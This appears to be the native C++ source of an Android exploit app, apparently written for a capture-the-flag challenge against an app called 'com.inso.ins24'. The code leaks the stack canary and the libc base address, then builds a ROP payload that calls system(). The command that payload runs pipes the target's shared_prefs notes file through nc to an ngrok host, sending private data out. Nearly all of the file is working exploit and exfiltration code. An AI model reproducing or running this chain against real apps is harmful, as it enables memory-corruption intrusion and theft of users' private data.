
#define LOG_TAG "[native_insomnipwn]"
#include "mylogger.h"

#include <string>
#include <cstdio>
#include <cstdlib>
#include <cassert>
#include "jni.h"

using namespace std;
int ends_with(const char *str, const char *suffix) {
    if (!str || !suffix)
        return 0;
    size_t lenstr = strlen(str);
    size_t lensuffix = strlen(suffix);
    if (lensuffix >  lenstr)
        return 0;
    return strncmp(str + lenstr - lensuffix, suffix, lensuffix) == 0;
}

// JNI_onLoad, must be extern C
extern "C"  jint JNI_OnLoad(JavaVM* vm, void* reserved) {
    ALOGI("Native library loaded!");
    JNIEnv* env = NULL;
    jint result = -1;
    if (vm->GetEnv((void**) &env, JNI_VERSION_1_4) != JNI_OK) {
        ALOGE("ERROR: GetEnv failed\n");
        goto bail;
    }
    assert(env != NULL);
    result = JNI_VERSION_1_4; //success -- return valid version number
    ALOGI("JNI_OnLoad success!");
bail:
    return result;
}

//apktool d app-debug.apk
//then, load the libmynativelib.so to Ghidra
static __attribute__((noinline)) __attribute__((optnone))
uint64_t canaryLeaker() {
    char *canaryPtr = (char*)(&canaryPtr)+0x08;

    //bunch of prints that should force the canary on the stack
    ALOGI("canaryLeaker= 0x%llx", canaryLeaker);
    ALOGI("JNI_OnLoad= 0x%llx", JNI_OnLoad);
    ALOGI("canaryPtr stored @ 0x%llx", &canaryPtr);
    ALOGI("canary addr= 0x%llx", canaryPtr);

    return *(uint64_t*)canaryPtr;
}

static uint64_t libcLeaker() {
    //using a libc function, e.g. "system" to find the libc base address might not work
    //because the compiler will generate plt stubs and these will be used instead of the real resolved
    //value.

    uint64_t libc_base = NULL;
    char * line = NULL;
    size_t line_len = 0;
    FILE *fp = fopen("/proc/self/maps", "r");
    if (fp == NULL) {
        ALOGE("failed to open /proc/self/maps");
        return NULL;
    }
    while (getline(&line, &line_len, fp) != -1) {
        //trim line endings
        if(line_len > 0)
            line_len = strlen(line);
        if(line_len > 0 && line[line_len-1] == '\n')
            line[--line_len] = '\0';
        if(ends_with(line, "/libc.so")) {
            void *addr_start, *addr_end;
            sscanf(line, "%p-%p", &addr_start, &addr_end);
            libc_base = reinterpret_cast<uint64_t>(addr_start);
            break;
        }
    }
    fclose(fp);
    if(line)
        free(line);

    return libc_base;
}

extern "C"
JNIEXPORT jlong JNICALL
Java_com_example_insomnipwn_MainActivity_nativeLeakCanary(JNIEnv *env, jobject thiz) {
    uint64_t canary = canaryLeaker();
    ALOGI("canary= 0x%llx", canary);
    return (jlong)canary;
}

extern "C"
JNIEXPORT jlong JNICALL
Java_com_example_insomnipwn_MainActivity_nativeLeakLibc(JNIEnv *env, jobject thiz) {
    uint64_t libc_base = libcLeaker();
    ALOGI("libc base= 0x%llx", libc_base);
    return (jlong)libc_base;
}

template<typename T>
static void write_buf(void *buf, size_t *len, T val) {
    char *cptr = reinterpret_cast<char *>(buf);
    memcpy(cptr+*len, &val, sizeof(val));
    *len += sizeof(val);
}
#define write_u8(buf, len, val) write_buf((buf), (len), (uint8_t)(val))
#define write_u64(buf, len, val) write_buf((buf), (len), (uint64_t)(val))
static void write_string(void *buf, size_t *len, char const *s) {
    char *cptr = reinterpret_cast<char *>(buf);
    size_t slen = strlen(s);
    memcpy(cptr+*len, s, slen+1);
    *len += slen+1;
}


extern "C"
JNIEXPORT jbyteArray JNICALL
Java_com_example_insomnipwn_MainActivity_buildPayload(JNIEnv *env, jobject thiz) {
    uint64_t canary = canaryLeaker();
    uint64_t libc_base = libcLeaker();

    ALOGI("canary= 0x%llx", canary);
    ALOGI("libc base= 0x%llx", libc_base);

    /*
     * When we are at pc=ret; in `get_algo`, here is how registers look like:
$rax   : 0x000077031bb80a10  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rsi   : 0x000077031bb80910  →  0x00007704f8927f00  →  0x00000000005c0000
$rdi   : 0x000077031bb80900  →  0x00007703005c0000
$r8    : 0x000077031bb808f8  →  0x00007703e8914460  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$r9    : 0x60
$r12   : 0x000077031bb80d40  →  0x000077031bb81090  →  0x000077031bb812e0  →  0x000077031bb81470  →  0x000077031bb815f0  →  0x000077031bb81810  →  0x0000000000000000
$r14   : 0x000077031bb80f90  →  0x0000000000000000

     rax points to our payload buffer (return value) on the stack
     $rdi is also pointing in the stack. Convenient!
     We will add some constants to $rdi so that it points to our `cmd` in the stack and then invoke
     `system(cmd)`
     */

    uint64_t gadget__add_rdi_0x90 = libc_base+0x00000000000cae06; // 0x00000000000cae06: add rdi, 0x90; mov rax, qword ptr [rdi]; pop rbx; ret;
    uint64_t gadget__noop         = libc_base+0x000000000007a60a; // 0x000000000007a60a: ret;
    uint64_t system__addr         = libc_base + 0x6f190; // system@@LIBC

    char *payload = static_cast<char *>(calloc(0x1000, sizeof(char)));
    size_t payload_len = 0;

    for(int i=0; i<56; i++) {
        write_u8(payload, &payload_len, 0x41); //padding
    }
    write_u64(payload, &payload_len, canary);
    write_u64(payload, &payload_len, 0x4242424242424242); //rbp
    ALOGI("Payload len until pop rbp; 0x%zx", payload_len);

    write_u64(payload, &payload_len, gadget__add_rdi_0x90); //pc
    write_u64(payload, &payload_len, 0x4141414141414141); //pop rbx

    write_u64(payload, &payload_len, gadget__add_rdi_0x90); //pc
    write_u64(payload, &payload_len, 0x4141414141414141); //pop rbx

    write_u64(payload, &payload_len, gadget__add_rdi_0x90); //pc
    write_u64(payload, &payload_len, 0x4141414141414141); //pop rbx
    write_u64(payload, &payload_len, gadget__noop); //pc. stack-alignment fix for movaps

    write_u64(payload, &payload_len, system__addr); //pc
    ALOGI("Payload len until pop pc=system; 0x%zx", payload_len);

    while(payload_len < 0xA0) {
        write_u8(payload, &payload_len, 0x41); //padding
    }

    //terminal1: ngrok tcp 5000
    //terminal2: nc -lnvp 5000
    const char *ngrok_pub_addr = "0.tcp.eu.ngrok.io";
    const int ngrok_pub_port = 15891;
    std::string cmd =
        std::string("cat /data/user/0/com.inso.ins24/shared_prefs/com.inso.ins24.mynotes.xml | nc ") +
        std::string(ngrok_pub_addr) + std::string(" ") + std::to_string(ngrok_pub_port);
    ALOGI("Using command: %s", cmd.c_str());
    write_string(payload, &payload_len, cmd.c_str());

    jbyteArray res = env->NewByteArray(payload_len);
    env->SetByteArrayRegion(res, 0, payload_len, reinterpret_cast<const jbyte *>(payload));
    return res;
}
